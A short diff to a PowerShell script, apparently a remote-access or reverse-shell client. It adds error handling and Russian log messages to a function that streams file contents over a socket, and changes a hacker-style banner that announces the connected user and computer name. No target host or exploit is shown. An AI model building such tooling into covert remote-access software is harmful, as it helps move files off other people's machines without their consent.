@@ -396,11 +396,18 @@ function Send-File {
         [string]$RemoteName = $(Split-Path $FilePath -Leaf)
     )
 
-    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $clientStream.WriteLine("!file $RemoteName $($bytes.Length)")
-    $clientStream.Write($bytes, 0, $bytes.Length)
-    $clientStream.Flush()
+    try {
+        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $global:writer.WriteLine("!file $RemoteName $($bytes.Length)")
+        $global:writer.Flush()
+        $global:clientStream.Write($bytes, 0, $bytes.Length)
+        $global:clientStream.Flush()
+        Output-Log "[+] Отправлен файл: $RemoteName"
+    } catch {
+        Output-Log "[ERROR] Не удалось отправить файл: $RemoteName — $($_.Exception.Message)"
+    }
 }
+
 
 function Send-FileRecursive {
     param (
@@ -748,7 +755,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            GO AROUND 2                                                                                                                                                                    
+                                            GO AROUND 3                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
